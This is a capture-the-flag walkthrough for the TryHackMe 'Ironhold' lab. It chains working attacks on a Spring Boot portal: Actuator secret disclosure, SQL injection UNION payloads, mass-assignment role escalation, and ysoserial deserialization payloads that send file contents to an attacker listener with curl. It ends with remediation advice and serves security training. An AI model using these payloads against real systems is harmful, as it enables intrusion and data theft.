# IronHold

The source leaked. Read it like an attacker, chain the flaws, and shell the door-control server.

Can you extract the secrets from the library?

The librarian rushed some final changes to the web application before heading off on holiday. In the process, they accidentally left sensitive information behind! Your challenge is to find and exploit the vulnerabilities in the application to extract these secrets.

IronHold is retiring its inmate-management platform. Somewhere in the handover, a developer pushed the complete repository to a public mirror and then left the company. Facility security wants a straight answer before the system goes dark for good: if that repository is out there, how far could someone actually get?

We start with nothing but what leaked: the full, unredacted source, and a live copy of the application still running on the network. No credentials, no map, no walkthrough. The code tells us what the developers got wrong; the running instance tells us if we're right.

Get all four and Ironhold's last system goes down the same way it went up: on its own mistakes.
Download the source archive attached to this task and start reading.

Room: https://tryhackme.com/room/ironhold

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/ironhold.md.md

## Overview

Ironhold is a Spring Boot facility-management portal containing a chained set of web vulnerabilities:

1. Exposed Spring Boot Actuator endpoints disclose a staff password.
2. Authenticated staff notices reveal the first flag.
3. SQL injection exposes a record unavailable through the website.
4. Mass assignment allows privilege escalation to `WARDEN`.
5. The warden door-control panel reveals the third flag.
6. Unsafe Java deserialization provides remote command execution.
7. The final flag is read from the facility server.

Set the target before beginning:

```bash
export TARGET="http://MACHINE_IP:8080"
```

---

## 1. Initial Enumeration

Start with a service scan:

```bash
nmap -sC -sV -p- --min-rate 5000 MACHINE_IP
```

The application is available on TCP port `8080`:

```text
http://MACHINE_IP:8080
```

Opening the site presents a login page for the Ironhold facility-management portal.

Because the application is built with Spring Boot, check whether Spring Boot Actuator endpoints are exposed:

```bash
curl -sS "$TARGET/actuator"
```

Format the response with `jq`:

```bash
curl -sS "$TARGET/actuator" | jq
```

The application exposes its Actuator environment endpoint without authentication.

---

## 2. Exposed Actuator Environment Variable

Spring Boot Actuator can disclose configuration properties and environment variables when incorrectly configured.

Request the kiosk password property:

```bash
curl -sS "$TARGET/actuator/env/KIOSK_PW" | jq
```

The response contains the value of the `KIOSK_PW` environment variable:

```json
{
  "property": {
    "source": "systemEnvironment",
    "value": "REDACTED_PASSWORD"
  }
}
```

Store the value automatically:

```bash
export KIOSK_PW=$(
  curl -sS "$TARGET/actuator/env/KIOSK_PW" |
  jq -r '.property.value'
)
```

Confirm that a value was retrieved:

```bash
printf '%s\n' "$KIOSK_PW"
```

The associated username is:

```text
kiosk
```

### Vulnerability

The application exposed all Actuator endpoints with configuration equivalent to:

```properties
management.endpoints.web.exposure.include=*
```

Sensitive environment values should not be available to unauthenticated users.

---

## 3. Authenticate as the Kiosk Account

### Browser method

Open:

```text
http://MACHINE_IP:8080/
```

Log in with:

```text
Username: kiosk
Password: value disclosed by /actuator/env/KIOSK_PW
```

A successful login redirects to:

```text
/dashboard
```

### Terminal method

Create an authenticated session:

```bash
curl -sS -c cookies.txt \
  --data-urlencode 'username=kiosk' \
  --data-urlencode "password=$KIOSK_PW" \
  "$TARGET/login" \
  -o /dev/null
```

Confirm that a session cookie was created:

```bash
cat cookies.txt
```

The file should contain a `JSESSIONID`.

---

## 4. Officer Dashboard Flag

After authenticating, the dashboard provides access to staff notices.

Open **View all notices**, or browse directly to:

```text
http://MACHINE_IP:8080/notices
```

Locate the notice named:

```text
Shift handover: kiosk account reminder
```

The first flag is contained in the notice body.

The page can also be requested from the terminal:

```bash
curl -sS -b cookies.txt "$TARGET/notices"
```

Extract the flag:

```bash
curl -sS -b cookies.txt "$TARGET/notices" |
grep -Eo 'THM\{[^}]+\}'
```

### Flag 1

```text
THM{FLAG_1_REDACTED}
```

---

## 5. Discover the Inmate Search

The authenticated portal includes an inmate search function.

Open the inmate section and use its quick-search field. The request is sent to:

```text
GET /inmates/search?q=SEARCH_TERM
```

Test a normal request:

```bash
curl -sS -b cookies.txt -G \
  --data-urlencode 'q=test' \
  "$TARGET/inmates/search"
```

The backend constructs its query by directly concatenating the supplied `q` parameter:

```java
String sql =
    "SELECT id, name, block FROM inmates WHERE name = '" + q + "'";
```

This creates a SQL injection vulnerability.

---

## 6. Determine the UNION Column Count

The original query returns three columns:

```text
id
name
block
```

A successful `UNION SELECT` must also return three columns.

Test with:

```sql
' UNION SELECT NULL,'test','test'-- 
```

Submit the payload:

```bash
curl -sS -b cookies.txt -G \
  --data-urlencode "q=' UNION SELECT NULL,'test','test'-- " \
  "$TARGET/inmates/search"
```

If the injected row appears in the results, the three-column UNION is valid.

---

## 7. Retrieve the Hidden Staff Record

The application’s database account can read another table named:

```text
case_files
```

The target record has the case number:

```text
IA-2024-007
```

Its title is:

```text
Internal Affairs Review
```

The flag is stored in its `summary` field.

Use the following payload:

```sql
' UNION SELECT NULL,title,summary
FROM case_files
WHERE case_number='IA-2024-007'-- 
```

### Browser method

Enter the payload into the inmate quick-search field:

```text
' UNION SELECT NULL,title,summary FROM case_files WHERE case_number='IA-2024-007'-- 
```

The returned row is displayed using the inmate table’s existing columns:

```text
ID:    null
Name:  Internal Affairs Review
Block: THM{FLAG_2_REDACTED}
```

### Terminal method

```bash
curl -sS -b cookies.txt -G \
  --data-urlencode "q=' UNION SELECT NULL,title,summary FROM case_files WHERE case_number='IA-2024-007'-- " \
  "$TARGET/inmates/search"
```

Extract the flag:

```bash
curl -sS -b cookies.txt -G \
  --data-urlencode "q=' UNION SELECT NULL,title,summary FROM case_files WHERE case_number='IA-2024-007'-- " \
  "$TARGET/inmates/search" |
grep -Eo 'THM\{[^}]+\}'
```

### Flag 2

```text
THM{FLAG_2_REDACTED}
```

This record could not be accessed through a normal page in the application. It was retrieved directly from the database through SQL injection.

---

## 8. Inspect the Profile Update Function

Open the kiosk account’s profile page.

The visible form allows the user to update:

```text
Full name
Email
Badge number
```

However, the backend binds the complete request to a `Staff` object:

```java
@PostMapping("/profile/update")
public String update(
        @ModelAttribute Staff staff,
        HttpSession session) {

    Staff current =
        staffRepository.findByUsername(
            SessionUtil.currentUsername(session));

    current.setFullName(staff.getFullName());
    current.setEmail(staff.getEmail());

    if (staff.getBadgeNumber() != null
            && !staff.getBadgeNumber().isBlank()) {
        current.setBadgeNumber(staff.getBadgeNumber());
    }

    if (staff.getRole() != null
            && !staff.getRole().isBlank()) {
        current.setRole(staff.getRole());
    }

    staffRepository.save(current);
    return "redirect:/profile";
}
```

Although `role` is not shown in the normal form, the backend accepts and saves it.

This is a mass-assignment, or overposting, vulnerability.

---

## 9. Escalate to WARDEN

### Browser method

Open the profile page and launch the browser developer tools.

Inspect the profile-update form and add:

```html
<input type="hidden" name="role" value="WARDEN">
```

Submit the form.

Refresh the page and confirm that the account now displays the `WARDEN` role.

### Terminal method

Submit the existing profile values while adding the unauthorized role:

```bash
curl -sS -b cookies.txt \
  --data-urlencode 'fullName=Shift Kiosk Account' \
  --data-urlencode 'email=kiosk@ironhold.example' \
  --data-urlencode 'badgeNumber=K-000' \
  --data-urlencode 'role=WARDEN' \
  "$TARGET/profile/update" \
  -o /dev/null
```

The application checks the current database role on each administrative request. The existing session gains warden access immediately.

Verify access:

```bash
curl -sS -b cookies.txt "$TARGET/admin/import" |
grep -E 'WARDEN|Bulk Import'
```

---

## 10. Warden Door-Control Panel

Open the administrative door-control panel:

```text
http://MACHINE_IP:8080/admin/control
```

The third flag is displayed on this page.

Retrieve it from the terminal:

```bash
curl -sS -b cookies.txt "$TARGET/admin/control" |
grep -Eo 'THM\{[^}]+\}'
```

### Flag 3

```text
THM{FLAG_3_REDACTED}
```

---

## 11. Identify the Import Function

The WARDEN role also provides access to:

```text
GET  /admin/import
POST /admin/import
```

Open:

```text
http://MACHINE_IP:8080/admin/import
```

The page explains that it accepts a Base64-encoded serialized Java manifest.

The backend performs operations equivalent to:

```java
byte[] decoded =
    Base64.getDecoder().decode(body.trim());

try (ObjectInputStream ois =
         new ObjectInputStream(
             new ByteArrayInputStream(decoded))) {

    Object restored = ois.readObject();
}
```

The application calls `readObject()` on attacker-controlled data without:

* Class allowlisting
* Object filters
* Type validation
* Cryptographic integrity checking

This creates an unsafe Java deserialization vulnerability.

---

## 12. Select a Compatible Gadget Chain

The application includes Apache Commons Collections in the vulnerable `3.2.x` range:

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>[3.2,3.2.2)</version>
</dependency>
```

A compatible ysoserial gadget chain is:

```text
CommonsCollections6
```

---

## 13. Prepare the AttackBox

Determine the AttackBox address that the target can reach:

```bash
ip -4 addr
```

Set it manually:

```bash
export ATTACKBOX_IP="YOUR_ATTACKBOX_IP"
```

Do not use `127.0.0.1`, `docker0`, or another container-only address.

Start an HTTP listener:

```bash
cd /tmp
python3 -m http.server 8000
```

Leave this terminal running.

---

## 14. Download ysoserial

In another terminal:

```bash
cd ~/Downloads
```

Download the prebuilt release:

```bash
wget \
  https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
```

Confirm the file exists:

```bash
ls -lh ysoserial-all.jar
```

Install Java if required:

```bash
sudo apt update
sudo apt install -y default-jre-headless
```

Modern Java versions restrict reflective access required by older ysoserial gadget chains. Use:

```text
--add-opens java.base/java.util=ALL-UNNAMED
--add-opens java.base/sun.reflect.annotation=ALL-UNNAMED
```

---

## 15. Recreate the Authenticated Session

When moving to another terminal, recreate the authenticated cookie:

```bash
cd ~/Downloads
```

Set the target again if necessary:

```bash
export TARGET="http://MACHINE_IP:8080"
```

Retrieve the password again:

```bash
export KIOSK_PW=$(
  curl -sS "$TARGET/actuator/env/KIOSK_PW" |
  jq -r '.property.value'
)
```

Log in:

```bash
curl -sS -c cookies.txt \
  --data-urlencode 'username=kiosk' \
  --data-urlencode "password=$KIOSK_PW" \
  "$TARGET/login" \
  -o /dev/null
```

Reapply the WARDEN role:

```bash
curl -sS -b cookies.txt \
  --data-urlencode 'fullName=Shift Kiosk Account' \
  --data-urlencode 'email=kiosk@ironhold.example' \
  --data-urlencode 'badgeNumber=K-000' \
  --data-urlencode 'role=WARDEN' \
  "$TARGET/profile/update" \
  -o /dev/null
```

Verify access:

```bash
curl -sS -b cookies.txt "$TARGET/admin/import" |
grep -E 'WARDEN|Bulk Import'
```

---

## 16. Confirm Remote Command Execution

Generate a serialized payload that attempts to read `/flag.txt` and send its contents to the AttackBox:

```bash
java \
  --add-opens java.base/java.util=ALL-UNNAMED \
  --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
  -jar ./ysoserial-all.jar \
  CommonsCollections6 \
  'bash -c curl${IFS}-g${IFS}-sS${IFS}http://'"$ATTACKBOX_IP"':8000/$(cat${IFS}/flag.txt)' |
base64 -w0 > payload.b64
```

`${IFS}` is used in place of literal spaces. This avoids argument-splitting problems when the command is executed through Java’s runtime process handling.

Confirm the payload is not empty:

```bash
wc -c payload.b64
```

Submit it:

```bash
curl -sS -b cookies.txt \
  -H 'Content-Type: text/plain' \
  --data-binary @payload.b64 \
  "$TARGET/admin/import"
```

The application should respond with:

```text
Batch accepted: HashSet
```

The Python listener may receive:

```text
GET / HTTP/1.1
```

An incoming request confirms:

* The serialized payload was processed.
* The gadget chain executed.
* The target can connect to the AttackBox.

The empty path indicates that `/flag.txt` did not exist or returned no content.

---

## 17. Locate the Facility Flag

The application’s likely deployment directory is:

```text
/opt/ironhold
```

Generate a payload that lists this directory and Base64-encodes the output:

```bash
java \
  --add-opens java.base/java.util=ALL-UNNAMED \
  --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
  -jar ./ysoserial-all.jar \
  CommonsCollections6 \
  'bash -c curl${IFS}-g${IFS}-sS${IFS}http://'"$ATTACKBOX_IP"':8000/$(ls${IFS}-la${IFS}/opt/ironhold|base64${IFS}-w0)' |
base64 -w0 > listdir.b64
```

Submit it:

```bash
curl -sS -b cookies.txt \
  -H 'Content-Type: text/plain' \
  --data-binary @listdir.b64 \
  "$TARGET/admin/import"
```

The listener receives a Base64 string in the request path:

```text
GET /BASE64_DATA HTTP/1.1
```

Copy the value after `GET /` and before ` HTTP/1.1`, then decode it:

```bash
printf '%s' 'BASE64_DATA' | base64 -d
```

The decoded directory listing shows:

```text
total 16
drwxr-xr-x 1 appuser appuser 4096 Jul 16 14:13 .
drwxr-xr-x 1 root    root    4096 Jul 10 18:56 ..
-r-------- 1 appuser appuser   28 Jul 18 06:54 flag.txt
```

The final flag is therefore located at:

```text
/opt/ironhold/flag.txt
```

---

## 18. Exfiltrate the Facility-Server Flag

Generate the final payload:

```bash
java \
  --add-opens java.base/java.util=ALL-UNNAMED \
  --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
  -jar ./ysoserial-all.jar \
  CommonsCollections6 \
  'bash -c curl${IFS}-g${IFS}-sS${IFS}http://'"$ATTACKBOX_IP"':8000/$(cat${IFS}/opt/ironhold/flag.txt)' |
base64 -w0 > finalflag.b64
```

Submit it:

```bash
curl -sS -b cookies.txt \
  -H 'Content-Type: text/plain' \
  --data-binary @finalflag.b64 \
  "$TARGET/admin/import"
```

The import endpoint responds:

```text
Batch accepted: HashSet
```

The Python listener receives:

```text
GET /THM{FLAG_4_REDACTED} HTTP/1.1
```

A `404` response from the Python server is expected. The AttackBox does not have a matching local file, but the flag has already been transmitted in the request path.

### Flag 4

```text
THM{FLAG_4_REDACTED}
```

# Vulnerability Summary

| Stage                | Vulnerability                           | Endpoint                 | Result                                      |
| -------------------- | --------------------------------------- | ------------------------ | ------------------------------------------- |
| Initial access       | Exposed Actuator environment values     | `/actuator/env/KIOSK_PW` | Disclosed the kiosk password                |
| Flag 1               | Excessive information exposure          | `/notices`               | Revealed the dashboard notice flag          |
| Flag 2               | SQL injection                           | `/inmates/search?q=`     | Read the hidden `case_files.summary` value  |
| Privilege escalation | Mass assignment                         | `/profile/update`        | Changed the kiosk role to `WARDEN`          |
| Flag 3               | Broken authorization chain              | `/admin/control`         | Opened the warden door-control panel        |
| Remote execution     | Unsafe Java deserialization             | `/admin/import`          | Executed a Commons Collections gadget chain |
| Flag 4               | Command execution and HTTP exfiltration | `/opt/ironhold/flag.txt` | Retrieved the facility-server flag          |

---

# Remediation

## Restrict Spring Boot Actuator

Expose only the Actuator endpoints required for monitoring:

```properties
management.endpoints.web.exposure.include=health,info
```

Place sensitive endpoints behind authentication and never return raw secret values.

## Parameterize SQL Queries

Replace string concatenation with prepared statements:

```java
String sql =
    "SELECT id, name, block FROM inmates WHERE name = ?";
```

Bind the search value through the database library rather than inserting it into the SQL string.

## Prevent Mass Assignment

Do not bind a database entity directly to user-controlled request parameters.

Use a dedicated request model:

```java
public class ProfileUpdateRequest {
    private String fullName;
    private String email;
    private String badgeNumber;
}
```

Authorization-sensitive fields such as `role` must only be modified through a separate administrator-only function.

## Remove Native Java Deserialization

Do not process attacker-controlled data with `ObjectInputStream`.

Use a safer format such as JSON and map it to a restricted data-transfer object. Where legacy Java serialization cannot be removed, apply strict `ObjectInputFilter` allowlisting and cryptographically authenticate imported data.

## Apply Least-Privilege Database Access

The account used by inmate search should not have permission to read unrelated tables such as `case_files`.

Separate application functions should use database roles with only the minimum permissions required.
